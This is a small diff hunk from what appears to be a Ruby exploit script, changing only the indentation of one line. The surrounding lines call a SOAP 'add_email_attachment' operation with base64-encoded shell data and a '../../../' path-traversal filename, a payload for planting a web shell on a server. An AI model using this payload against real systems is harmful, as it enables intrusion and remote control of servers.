@@ -34,7 +34,7 @@ puts client.operations
 
 puts "\n\n[*] Interact with :add_email_attachment operation"
 response = client.call( :add_email_attachment, 
-                       message: {
+                        message: {
                                  emailid:  rand(100),
                                  filedata: [shell_data].pack("m0"),
                                  filename: "../../../../../../#{shell_name}",
